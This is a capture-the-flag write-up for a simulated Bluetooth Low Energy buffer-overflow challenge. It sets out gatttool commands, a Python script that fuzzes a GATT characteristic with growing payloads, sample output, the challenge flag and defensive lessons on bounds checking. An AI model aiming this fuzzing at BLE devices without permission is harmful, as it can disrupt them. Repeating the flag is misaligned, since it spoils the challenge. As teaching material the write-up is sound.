# Writeup - Challenge 09: Buffer Overflow (Simulated)

**Difficulty:** ⭐⭐⭐⭐⭐ Advanced
**Category:** Bluetooth Low Energy
**Flag:** `WOCSA{fuzzing_reveals_hidden_bugs}`

---

## 🔍 Step 1: Connect and Enumerate

```bash
bluetoothctl
[bluetooth]# scan on
```

Expected output:
```
[NEW] Device AA:BB:CC:DD:EE:FF THCON26_BLE_09
```

Note the MAC address (e.g., `AA:BB:CC:DD:EE:FF`).

```bash
gatttool -b AA:BB:CC:DD:EE:FF -I
[AA:BB:CC:DD:EE:FF][LE]> connect
[AA:BB:CC:DD:EE:FF][LE]> characteristics
```

You will find two characteristics:
```
handle: 0x0003  properties: READ   uuid: 30766572-666c-3077-0002-...  (OUTPUT)
handle: 0x0005  properties: WRITE  uuid: 30766572-666c-3077-0001-...  (INPUT)
```

---

## 📖 Step 2: Read Initial State

```bash
[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0003
# Characteristic value: "Ready: send input"
```

---

## ✍️ Step 3: Normal Write (Echo Behavior)

Send a short payload (10 bytes of `A` = `41` in hex):

```bash
[AA:BB:CC:DD:EE:FF][LE]> char-write-req 0x0005 41414141414141414141
[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0003
# Characteristic value: "AAAAAAAAAA"  (echoed back)
```

Normal behavior confirmed.

---

## 🔬 Step 4: Fuzz with Increasing Payload Sizes

Write payloads of increasing size to find the threshold:

```python
import asyncio
from bleak import BleakClient

MAC = input("Enter target MAC address: ")
INPUT_UUID  = "30766572-666c-3077-0001-00805f9b34fb"
OUTPUT_UUID = "30766572-666c-3077-0002-00805f9b34fb"

async def main():
    async with BleakClient(MAC) as client:
        for size in [5, 10, 20, 30, 40, 50, 51, 60, 100]:
            payload = b"A" * size
            print(f"[*] Writing {size} bytes...")
            await client.write_gatt_char(INPUT_UUID, payload)

            output = await client.read_gatt_char(OUTPUT_UUID)
            decoded = output.decode("utf-8", errors="ignore")
            print(f"    Output ({len(output)} bytes): {decoded[:60]}")

            if "WOCSA{" in decoded:
                print(f"\n[!!!] FLAG FOUND: {decoded}")
                break

asyncio.run(main())
```

---

## 💥 Step 5: Trigger the Overflow

At 51 bytes, the crash state is triggered:

```
[*] Writing 5 bytes...
    Output: AAAAA
[*] Writing 10 bytes...
    Output: AAAAAAAAAA
[*] Writing 20 bytes...
    Output: AAAAAAAAAAAAAAAAAAAA
[*] Writing 30 bytes...
    Output: Warning: input truncated at 20 bytes
[*] Writing 50 bytes...
    Output: Warning: input truncated at 20 bytes
[*] Writing 51 bytes...
    Output: WOCSA{fuzzing_reveals_hidden_bugs}

[!!!] FLAG FOUND: WOCSA{fuzzing_reveals_hidden_bugs}
```

---

## 🎯 Flag

```
WOCSA{fuzzing_reveals_hidden_bugs}
```

---

## Key Takeaways

* **Fuzzing** — sending unexpected, oversized, or malformed inputs — is a fundamental technique for finding bugs in embedded firmware
* BLE characteristics accept raw bytes; the firmware is responsible for validating length and content
* In real embedded systems, a buffer overflow can overwrite adjacent memory (stack return addresses, heap data, security flags), leading to arbitrary code execution or data leaks
* **Defense:** Always validate input length before copying: `if (len > BUFFER_SIZE) { return error; }` — never copy without bounds checking
* Even simulated crashes reveal the programmer's mental model — security-sensitive data should never be adjacent to user-controlled buffers in memory
